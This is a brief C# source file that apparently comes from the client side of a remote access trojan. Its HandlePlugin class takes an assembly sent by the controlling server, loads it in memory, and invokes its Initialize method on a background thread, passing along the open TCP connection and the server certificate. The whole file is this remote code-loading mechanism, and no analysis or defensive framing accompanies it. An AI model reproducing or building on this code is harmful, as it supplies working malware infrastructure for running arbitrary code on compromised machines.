using Client.MessagePack;
using Client.Connection;
using System;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using Client.Helper;

namespace Client.Handle_Packet
{
    public class HandlePlugin
    {
        public HandlePlugin(MsgPack unpack_msgpack)
        {
            new Thread(delegate ()
            {
                try
                {
                    Assembly plugin = Assembly.Load(unpack_msgpack.ForcePathObject("Plugin").GetAsBytes());
                    MethodInfo meth = plugin.GetType("Plugin.Plugin").GetMethod("Initialize");
                    meth.Invoke(null, new object[] { ClientSocket.TcpClient, Settings.ServerCertificate });
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                    Packet.Error(ex.Message);
                }
            })
            { IsBackground = true }.Start();
        }
    }
}
